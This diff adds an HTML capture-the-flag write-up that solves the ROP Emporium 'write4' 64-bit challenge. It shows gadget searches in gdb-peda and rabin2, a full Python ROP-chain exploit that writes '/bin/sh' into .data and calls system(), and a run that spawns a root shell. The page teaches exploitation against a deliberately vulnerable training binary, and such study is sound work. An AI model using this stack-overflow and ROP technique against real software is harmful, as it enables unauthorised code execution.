@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>#ROP Emporium - 64bit - write4</strong></h1>
+        <a href="https://ropemporium.com/challenge/write4.html">https://ropemporium.com/challenge/write4.html</a><br>
+        <br>
+        <img alt="images\8-1.png" src="images/8-1.png"><br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>Challenge Description</strong></h2><br>
+        Description for <code>write4</code> on ropemporium:<br>
+            <div class="codebox">
+                Our&nbsp;first&nbsp;foray&nbsp;into&nbsp;proper&nbsp;gadget&nbsp;use.&nbsp;A&nbsp;call&nbsp;to&nbsp;system()&nbsp;is&nbsp;still&nbsp;present&nbsp;but&nbsp;we'll&nbsp;need&nbsp;to&nbsp;write&nbsp;a&nbsp;string&nbsp;into&nbsp;memory&nbsp;somehow.
+            </div>
+        </div><br>
+        <br>
+        We need to read the flag, except that this time no <code>“/bin/cat flag.txt�</code> string has been provided for us.<br>
+        For this challenge, we need to write a string to memory.<br>
+        <br>
+        We could write either <code>/bin/sh</code> and read the flag ourselves or <code>/bin/cat flag.txt</code>.<br>
+        <code>/bin/sh</code> is arguably easier to write to memory because it will fit into a 64-bit, 8 byte memory address.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>How to write a string to memory</strong></h2><br>
+        The most common to way to write a string to memory is to use a <code>mov [?], ?</code> instruction, for example <code>mov [r14], r15</code>.<br>
+        <code>mov [r14], r15</code> will copy the value in <code>r15</code> into the memory address pointed to by <code>r15</code>.<br>
+        <br>
+        To set up the registers for this <code>mov</code> instruction, we'd need to find a <code>pop r14; pop r15; ret</code> instruction.<br>
+        In this theoretical example, there's a <code>pop r14; pop r15; ret</code> at <code>0x00400890</code>.<br>
+        <br>
+        • First, we <code>pop</code> the the writable section of memory into <code>R14</code><br>
+        • Next, we <code>pop</code> our <code>/bin/sh</code> string into <code>R15</code> (with a NULL byte to signify the end of the string)<br>
+        • Lastly, we write <code>/bin/sh</code> string to memory using <code>mov</code><br>
+        <br>
+        <em><strong>For example</strong></em><br>
+            <div class="codebox">
+                <span style="color:#0088ff;font-weight:400">#&nbsp;GADGETS</span><br>
+                pop_r14_pop_r15_ret&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00400890</span>)<br>
+                data_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00601050</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;.data&nbsp;-&nbsp;writable&nbsp;section&nbsp;of&nbsp;memory&nbsp;-&nbsp;16&nbsp;bytes</span><br>
+                <br>
+                mov_r15_r14_ret&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00400820</span>)&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;mov&nbsp;QWORD&nbsp;PTR&nbsp;[r14],r15;&nbsp;ret</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;move&nbsp;value&nbsp;in&nbsp;r15&nbsp;to&nbsp;address&nbsp;pointed&nbsp;to&nbsp;by&nbsp;r14</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;EXPLOIT</span><br>
+                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;offset&nbsp;to&nbsp;RIP</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Stage&nbsp;1&nbsp;-&nbsp;Set&nbsp;up&nbsp;to&nbsp;write&nbsp;"/bin/sh"&nbsp;to&nbsp;memory</span><br>
+                payload&nbsp;+=&nbsp;pop_r14_pop_r15_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overwrite&nbsp;RIP</span><br>
+                payload&nbsp;+=&nbsp;data_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;writable&nbsp;memory&nbsp;address&nbsp;into&nbsp;r14</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"/bin/sh\x00"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;"/bin/sh\x00"&nbsp;into&nbsp;r15</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Stage&nbsp;2&nbsp;-&nbsp;Write&nbsp;"/bin/sh"&nbsp;to&nbsp;memory</span><br>
+                payload&nbsp;+=&nbsp;mov_r15_r14_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;write&nbsp;"/bin/sh\x00"&nbsp;to&nbsp;memory</span>
+            </div>
+        </div><br>
+        <br>
+        Later, when you want to use the <code>/bin/sh</code> string, you can reference it using its address in memory - <code>data_addr</code><br>
+        <br>
+        e.g. with system()<br>
+            <div class="codebox">
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Stage&nbsp;3&nbsp;-&nbsp;Run&nbsp;system("/bin/sh")</span><br>
+                payload&nbsp;+=&nbsp;pop_rdi_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;set&nbsp;up&nbsp;system()&nbsp;parameters</span><br>
+                payload&nbsp;+=&nbsp;data_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;"/bin/sh"&nbsp;@&nbsp;dynamic_addr&nbsp;into&nbsp;RDI</span><br>
+                payload&nbsp;+=&nbsp;system_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;run&nbsp;system()</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>write4 Solution</strong></h2><br>
+        We need to find<br>
+        • A <code>mov</code> gadget that writes to memory<br>
+        • A pop gadget to set up our <code>mov</code> gadget's registers<br>
+        • A writable section of memory<br>
+        • A <code>pop rdi; ret</code> gadget to set up the parameters for <code>system()</code><br>
+        • The address of <code>system()</code><br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>1) Find a mov gadget</strong></h2><br>
+        We need to find a a mov instruction/gadget that writes to memory and then returns<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/write4#&nbsp;gdb&nbsp;-q&nbsp;write4<br>
+                Reading&nbsp;symbols&nbsp;from&nbsp;write4...(no&nbsp;debugging&nbsp;symbols&nbsp;found)...done.<br>
+                gdb-peda$&nbsp;set&nbsp;follow-fork-mode&nbsp;parent<br>
+                gdb-peda$&nbsp;break&nbsp;main<br>
+                Breakpoint&nbsp;1&nbsp;at&nbsp;0x40074a<br>
+                gdb-peda$&nbsp;run<br>
+                Starting&nbsp;program:&nbsp;/root/ctf/ropemporium/write4/write4&nbsp;<br>
+                <br>
+                ...<br>
+                <br>
+                Breakpoint&nbsp;1,&nbsp;0x000000000040074a&nbsp;in&nbsp;main&nbsp;()<br>
+                <br>
+                gdb-peda$&nbsp;ropsearch&nbsp;"mov&nbsp;?,&nbsp;?"<br>
+                Searching&nbsp;for&nbsp;ROP&nbsp;gadget:&nbsp;'mov&nbsp;?,&nbsp;?'&nbsp;in:&nbsp;binary&nbsp;ranges<br>
+                0x00400821&nbsp;:&nbsp;(b'893ec3') mov&nbsp;DWORD&nbsp;PTR&nbsp;[rsi],edi;&nbsp;ret<br>
+                0x00400820&nbsp;:&nbsp;(b'4d893ec3') mov&nbsp;QWORD&nbsp;PTR&nbsp;[r14],r15;&nbsp;ret<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        <code>mov QWORD PTR [r14],r15; ret</code> at <code>0x00400820</code> is perfect.<br>
+        This instruction will move the value in r15 (our /bin/sh string) into the address pointed to by r14 (a memory address we can write to).<br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>2) Find a ‘pop’ gadget to set up the 'mov' gadget's registers</strong></h2><br>
+        Now we need to find a <code>pop</code> gadget that will pop values into the registers specified in our <code>mov</code> instruction - <code>r14</code> and <code>r15</code>.<br>
+            <div class="codebox">
+                gdb-peda$&nbsp;ropsearch&nbsp;"pop&nbsp;r14"<br>
+                Searching&nbsp;for&nbsp;ROP&nbsp;gadget:&nbsp;'pop&nbsp;r14'&nbsp;in:&nbsp;binary&nbsp;ranges<br>
+                0x00400890&nbsp;:&nbsp;(b'415e415fc3') pop&nbsp;r14;&nbsp;pop&nbsp;r15;&nbsp;ret
+            </div>
+        </div><br>
+        <br>
+        <code>pop r14; pop r15; ret</code> at <code>0x00400890</code> couldn't be more perfect.<br>
+        <br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>3) Find a writable section of memory</strong></h2><br>
+        You can find a writable section of memory by reading the binary's sections.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/write4#&nbsp;rabin2&nbsp;-S&nbsp;write4<br>
+                [Sections]<br>
+                Nm&nbsp;Paddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Size&nbsp;Vaddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memsz&nbsp;Perms&nbsp;Name<br>
+                ...<br>
+                19&nbsp;0x00000e10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;0x00600e10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;-rw-&nbsp;.init_array<br>
+                20&nbsp;0x00000e18&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;0x00600e18&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;-rw-&nbsp;.fini_array<br>
+                21&nbsp;0x00000e20&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;0x00600e20&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;-rw-&nbsp;.jcr<br>
+                22&nbsp;0x00000e28&nbsp;&nbsp;&nbsp;464&nbsp;0x00600e28&nbsp;&nbsp;&nbsp;464&nbsp;-rw-&nbsp;.dynamic<br>
+                23&nbsp;0x00000ff8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;0x00600ff8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;-rw-&nbsp;.got<br>
+                24&nbsp;0x00001000&nbsp;&nbsp;&nbsp;&nbsp;80&nbsp;0x00601000&nbsp;&nbsp;&nbsp;&nbsp;80&nbsp;-rw-&nbsp;.got.plt<br>
+                25&nbsp;0x00001050&nbsp;&nbsp;&nbsp;&nbsp;16&nbsp;0x00601050&nbsp;&nbsp;&nbsp;&nbsp;16&nbsp;-rw-&nbsp;.data<br>
+                26&nbsp;0x00001060&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;0x00601060&nbsp;&nbsp;&nbsp;&nbsp;48&nbsp;-rw-&nbsp;.bss<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        You should pick a section that has enough bytes to write your string.<br>
+        The <code>.data</code> section is big enough to write <code>/bin/sh\x00</code> - 8 bytes, but not big enough to write <code>/bin/cat flag.txt\x00</code> - 18 bytes.<br>
+        <br>
+        Your 2 options here are the GOT table - <code>.got.plt</code>, and the heap - <code>.data</code>.<br>
+        I'm writing the string /bin/sh, so I chose <code>.data</code> at <code>0x00601050</code>.<br>
+        <br>
+        We have everything we need to write our string to memory at this point.<br>
+        Now we just need to find a <code>pop rdi; ret</code> to set up the parameter(s) for system() and the address of <code>system()</code>.<br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>4) Find a pop rdi; ret gadget</strong></h2><br>
+            <div class="codebox">
+                gdb-peda$&nbsp;ropsearch&nbsp;"pop&nbsp;rdi"<br>
+                Searching&nbsp;for&nbsp;ROP&nbsp;gadget:&nbsp;'pop&nbsp;rdi'&nbsp;in:&nbsp;binary&nbsp;ranges<br>
+                0x00400893&nbsp;:&nbsp;(b'5fc3') pop&nbsp;rdi;&nbsp;ret
+            </div>
+        </div><br>
+        <br>
+        There's a <code>pop rdi; ret</code> at <code>0x00400893</code>.<br>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
+        <h2><strong>5) Find address of system()</strong></h2><br>
+        Find the address of system() by reading the binary's imports.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/write4#&nbsp;rabin2&nbsp;-i&nbsp;write4<br>
+                [Imports]<br>
+                Num&nbsp;&nbsp;Vaddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bind&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Type&nbsp;Name<br>
+                &nbsp;&nbsp;&nbsp;1&nbsp;0x004005d0&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;puts<br>
+                &nbsp;&nbsp;&nbsp;2&nbsp;0x004005e0&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;system<br>
+                &nbsp;&nbsp;&nbsp;3&nbsp;0x004005f0&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;printf<br>
+                &nbsp;&nbsp;&nbsp;4&nbsp;0x00400600&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;memset<br>
+                &nbsp;&nbsp;&nbsp;5&nbsp;0x00400610&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;__libc_start_main<br>
+                &nbsp;&nbsp;&nbsp;6&nbsp;0x00400620&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;fgets<br>
+                &nbsp;&nbsp;&nbsp;7&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;NOTYPE&nbsp;__gmon_start__<br>
+                &nbsp;&nbsp;&nbsp;8&nbsp;0x00400630&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;setvbuf<br>
+                &nbsp;&nbsp;&nbsp;7&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;NOTYPE&nbsp;__gmon_start__
+            </div>
+        </div><br>
+        <br>
+        <code>system()</code> is at <code>0x004005e0</code>.<br>
+        <br>
+        <a id="h2-9" name="h2-9"></a><strong></strong>
+        <h2><strong>6) Write exploit script</strong></h2><br>
+        We have everything we need to write to memory and run system()!<br>
+        Write your exploit script.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>Exploit Plan</strong></h3><br>
+        1. Write 40 bytes of junk to reach the offset to RIP at 40 bytes<br>
+        2. Write <code>pop r14; pop r15; ret</code> gadget to the stack<br>
+        1) Write the <code>.data</code> address (our writable section of memory) to the stack so that it'll get popped into R14<br>
+        2) Write our string to the stack so that it'll get popped into R15<br>
+        3. Run the <code>mov [r14],r15; ret</code> instruction to move the value in R15 (our <code>/bin/sh</code> string) into to the address pointed to by R14 (our <code>.data</code> address)<br>
+        4. Write our <code>pop rdi; ret</code> to the stack<br>
+        1) Write the the address of our <code>/bin/sh</code> string to the stack (our <code>.data</code> address) so that it'll get popped into RDI<br>
+        5. Run <code>system()</code><br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>Python Script</strong></h3><br>
+            <div class="codebox">
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;struct<br>
+                <br>
+                pop_r14_pop_r15_ret&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00400890</span>)<br>
+                data_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00601050</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;.data&nbsp;-&nbsp;writable&nbsp;section&nbsp;of&nbsp;memory&nbsp;-&nbsp;16&nbsp;bytes</span><br>
+                <br>
+                mov_r15_r14_ret&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00400820</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;mov&nbsp;QWORD&nbsp;PTR&nbsp;[r14],r15;&nbsp;ret</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;move&nbsp;value&nbsp;in&nbsp;r15&nbsp;to&nbsp;address&nbsp;pointed&nbsp;to&nbsp;by&nbsp;r14</span><br>
+                pop_rdi_ret&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00400893</span>)<br>
+                system_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x004005e0</span>)<br>
+                <br>
+                <br>
+                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;offset&nbsp;to&nbsp;RIP&nbsp;@&nbsp;40&nbsp;bytes</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Stage&nbsp;1&nbsp;-&nbsp;Set&nbsp;up&nbsp;to&nbsp;write&nbsp;"/bin/sh"&nbsp;to&nbsp;memory</span><br>
+                payload&nbsp;+=&nbsp;pop_r14_pop_r15_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overwrite&nbsp;RIP</span><br>
+                payload&nbsp;+=&nbsp;data_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;writable&nbsp;section&nbsp;of&nbsp;memory&nbsp;into&nbsp;r14</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"/bin/sh\x00"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;"/bin/sh\x00"&nbsp;into&nbsp;r15</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Stage&nbsp;2&nbsp;-&nbsp;Write&nbsp;"/bin/sh"&nbsp;to&nbsp;memory</span><br>
+                payload&nbsp;+=&nbsp;mov_r15_r14_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;write&nbsp;"/bin/sh\x00"&nbsp;to&nbsp;memory</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Stage&nbsp;3&nbsp;-&nbsp;Run&nbsp;system("/bin/sh")</span><br>
+                <span style="color:#0088ff;font-weight:400">#payload&nbsp;+=&nbsp;"B"*6</span><br>
+                payload&nbsp;+=&nbsp;pop_rdi_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;set&nbsp;up&nbsp;system()&nbsp;parameters</span><br>
+                payload&nbsp;+=&nbsp;data_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;"/bin/sh"&nbsp;string&nbsp;into&nbsp;RDI</span><br>
+                payload&nbsp;+=&nbsp;system_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;run&nbsp;system()</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-10" name="h2-10"></a><strong></strong>
+        <h2><strong>7) Win!</strong></h2><br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/write4#&nbsp;(python&nbsp;write4pwn2.py;&nbsp;cat)&nbsp;|&nbsp;./write4<br>
+                write4&nbsp;by&nbsp;ROP&nbsp;Emporium<br>
+                64bits<br>
+                <br>
+                Go&nbsp;ahead&nbsp;and&nbsp;give&nbsp;me&nbsp;the&nbsp;string&nbsp;already!<br>
+                &gt;&nbsp;id<br>
+                uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root)<br>
+                cat&nbsp;flag.txt<br>
+                ROPE{a_placeholder_32byte_flag!}<br>
+                ^C<br>
+                Segmentation&nbsp;fault
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
